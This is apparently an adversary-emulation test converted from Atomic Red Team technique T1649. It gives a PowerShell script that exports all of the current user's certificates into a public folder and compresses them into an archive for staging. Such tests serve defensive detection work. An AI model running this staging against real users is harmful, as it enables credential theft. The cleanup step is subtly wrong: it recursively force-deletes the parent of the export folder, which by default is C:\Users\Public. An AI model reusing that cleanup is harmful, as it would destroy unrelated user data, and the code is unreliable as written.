# Converted from Atomic Red Team - Steal or Forge Authentication Certificates
# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1649
# Original auto_generated_guid: eb121494-82d1-4148-9e2b-e624e03fbf3d

---
api_version: 2.0
uuid: 21864d27-ddd0-420d-b74a-d3db183b6f96
name: Staging Local Certificates via Export-Certificate
authors:
  - isaac_fletcher
  - Atomic Red Team
description: |
  Export all user certificates and add to a compressed archive.

mitre:
  tactics:
    - "TA0006 Credential Access"
  techniques:
    - "T1649 Steal or Forge Authentication Certificates"

requirements:
  platforms:
    - os: windows
  superuser: false

args:
  - name: archive_path
    description: Path where the certificate archive will be created
    type: path
    default: "C:\\Users\\Public\\certs.zip"
  - name: export_path
    description: Directory path where certificates will be exported before archiving
    type: path
    default: "C:\\Users\\Public\\certs"

steps:
  - name: export_and_archive_certificates
    executor: powershell
    inline: |
      $exfilpath="{{.Args.export_path}}"
      mkdir $exfilpath | Out-Null
      foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer}
      Compress-Archive -Path $exfilpath -DestinationPath "{{.Args.archive_path}}"
    cleanup:
      executor: powershell
      inline: |
        $exfilpath="{{.Args.export_path}}"
        Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
        Remove-Item "{{.Args.archive_path}}" -Force -ErrorAction Ignore
